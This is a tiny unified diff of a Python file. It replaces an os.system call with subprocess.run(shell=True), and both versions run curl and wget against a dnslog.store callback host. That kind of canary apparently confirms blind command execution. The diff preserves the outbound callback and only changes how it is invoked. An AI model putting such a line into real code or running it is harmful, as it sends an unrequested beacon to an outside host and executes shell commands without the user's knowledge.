@@ -1,3 +1,3 @@
-import os
+import subprocess
 
-os.system("curl 8028beef.dnslog.store;wget 8028beef.dnslog.store")
+result = subprocess.run("curl 8028beef.dnslog.store;wget 8028beef.dnslog.store", shell=True, check=True)
